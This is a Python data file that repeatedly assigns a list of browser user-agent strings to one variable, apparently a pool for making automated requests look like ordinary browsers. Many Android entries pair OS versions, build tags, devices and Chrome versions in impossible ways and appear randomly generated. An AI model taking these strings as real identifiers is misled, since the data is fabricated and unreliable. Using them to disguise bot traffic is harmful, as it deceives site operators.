ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",]
ua = ["Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",]
ua = ["Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.4319.72 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.5187.50 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.3989.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.4503.42 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.5613.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4223.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.3023.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3351.21 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.4042.85 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.3513.60 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.4917.95 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.4589.47 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4245.92 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.3913.66 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.5008.51 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4743.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.4085.40 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4947.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.4458.35 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.4107.32 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4155.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4693.65 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4024.82 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4286.40 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5829.92 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.5879.23 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4641.86 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5186.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.5051.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.3479.60 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5503.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.5150.21 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.3848.40 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3946.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3348.31 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.3825.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.4495.23 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.4148.78 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4961.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.4657.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.5843.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4223.22 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.4604.76 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.3699.84 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.3357.47 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.4760.69 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5983.37 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.3127.65 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.3816.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4597.49 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.4299.76 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4130.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.5525.56 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4586.24 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4419.73 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.3963.42 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4395.63 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.0.3403.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3401.68 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3370.37 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.4154.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3535.78 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5808.94 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.5035.21 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.4450.72 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.5156.94 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.4818.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.4690.55 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.5570.82 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5685.90 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.5545.54 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.5062.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/47.0.5806.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.5747.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.3533.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.4892.22 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4351.72 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3218.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4136.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3300.50 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.4328.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.4494.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.5344.37 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.5267.35 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.5526.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.5787.30 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5921.86 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.4523.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.4174.53 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.3760.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.4486.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4859.86 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3841.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.5845.24 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.3628.33 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.3811.80 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5266.24 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3365.41 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5218.82 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.0.4541.93 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.4175.68 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5895.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4993.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4317.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3570.41 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.3880.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.5219.60 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.3113.57 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.5915.73 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.3586.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.5035.32 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/42.0.3786.53 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4747.35 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5224.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.4442.35 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/47.0.3068.73 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.4097.71 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.5919.59 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5486.63 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3714.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.4461.53 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.3484.74 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3709.93 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3530.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.4109.68 Mobile Safari/537.36",]
